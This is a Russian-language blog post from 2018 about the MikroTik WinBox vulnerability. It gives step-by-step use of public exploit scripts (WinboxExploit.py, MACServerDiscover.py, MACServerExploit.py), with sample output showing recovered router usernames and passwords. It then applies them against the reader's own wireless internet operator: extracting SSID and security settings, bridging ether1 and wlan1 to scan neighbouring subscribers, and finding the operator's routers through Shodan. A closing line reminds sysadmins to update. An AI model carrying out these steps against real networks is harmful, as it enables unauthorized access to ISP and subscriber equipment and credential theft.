---
title: "Mikrotik WinBoxExploit изучаем оператора радио-доступа."
date: 2018-12-05 09:52:51 +0000
categories:
  - Mikrotik
tags:
  - Mikrotik
  - Winbox
  - Exploit
sidebar:
  - title: "Mikrotik WinBoxExploit"
    image: http://placehold.it/350x250
    image_alt: "image"
    text: "Some text here."
  - title: "Another Title"
    text: "More text here."
---
 
Первая новость о взломе на сайте Mikrotik  появилась 25 марта 2018 г. 
https://blog.mikrotik.com/security/winbox-vulnerability.html (update 9th Oct, 2018 New Exploit )

В ней говорится что уязвимость  обнаружена в версиях:

*Affected all bugfix releases from 6.30.1 to 6.40.7, fixed in 6.40.8 on 2018-Apr-23
*Affected all current releases from 6.29 to 6.42, fixed in 6.42.1 on 2018-Apr-23
*Affected all RC releases from 6.29rc1 to 6.43rc3, fixed in 6.43rc4 on on 2018-Apr-23

На странице [https://github.com/BigNerd95/WinboxExploit](https://github.com/BigNerd95/WinboxExploit), выложен python скрипт взлома пароля к роутерам mikrotik.

Более подробно о методике выявления уязвимости рассказано на странице [https://n0p.me/winbox-bug-dissection/](https://n0p.me/winbox-bug-dissection/), ссылка есть на github у того же [BigNerd95](https://github.com/BigNerd95/WinboxExploit).

  Вероятно, можно построить свою ботнет сеть, с помощью  такой уязвимости и уже кто-то это сделал:  
  * На взломанных роутерах появились надписи HACKED FTP server, HACKED-ROUTER-HELP-SOS-WAS-MFWORM-INFECTED или HACKED-ROUTER-HELP-SOS-HAD-DEFAULT-PASSWORD ([см более подробно на сайте хакер](https://xakep.ru/2018/03/29/hajime-hunts-mikrotik/)).
  * Также есть герой с [https://habr.com/users/LMonoceros/](https://habr.com/users/LMonoceros/ )  который написал скрипт , который заблокировал эту уязвимость     и оставил доступ только из локальной сети [Для чего хакерам Микротик и как я спрятал 100 тыс. RouterOS от ботнета](https://habr.com/post/424433/) 

Для того что бы применить скрипт, нет ничего сложного: 
```bash
# python WinboxExploit.py  _ip_address_
```
результатом будет: 
{% highlight python %}
5.14.128.18
User: root
Pass:
User: admin
Pass:
User: admin
Pass: ddsER
User: create
Pass: WBCWGwewe
{% endhighlight %}

### Немножко усложним задачу:
-<s>Взломаем</s> Изучим оператора, который предоставляет вам радиодоступ, когда мы не знаем _IP address_ оборудования или если он не настроен . У нас есть только прямое подключение к клиентскому оборудованию, которое по радио подлючено к точке доступа оператора.

![]({{ site.baseurl }}/uploads/800-IMG_20160430_143159.jpg "пример подключения")

Данный exploit позволяет просканировать L2 сегмент сети и обнаружить mac адреса Mikrotik.
```bash
$ python MACServerDiscover.py
Looking for Mikrotik devices (MAC servers)
    aa:bb:cc:dd:ee:ff 
    aa:bb:cc:dd:ee:aa
```
После чего запускаем уже следующий скрипт.
```bash
$ python MACServerExploit.py aa:bb:cc:dd:ee:ff
User: admin
Pass: Th3P4ssWord
```

Дальше можно применить свои знания и умения по подключению через winbox, ssh,  telnet, к оборудониваю и узнать ssid security. Что даст нам вожможность заменить оконечное оборудование самостоятельно, к примеру при покупке более мощной абонентской точкой доступа.

Если оператор  не позаботился о безопасности, и не запретил _forwarding_ между абонентскими точками доступа, можно настроить bridge между ether1 и wlan1 и просканировать по mac адресам соседей/сектора.  
```bash
/interface bridge
add name=bridge1
/interface bridge port
add bridge=bridge1 interface=ether1
add bridge=bridge1 interface=wlan1
```
### Усложним задачу еще немножко:

Используя сервис [https://bgp.he.net](https://bgp.he.net), узнаем свой ip_address и prefixv4 своего оператора, проверим его на сервисе [https://shodan.io](https://shodan.io).
Введя  в строке поиска (_доступно после регистрации_)
```bash
mikrotik net:"5.140.28.0/19"
```
и получим:
![]({{ site.baseurl }}/uploads/shodan.png "результаты поиска")



### Sysadmin не забывай обновлять routeros , настривать правила доступа к оборудованию.

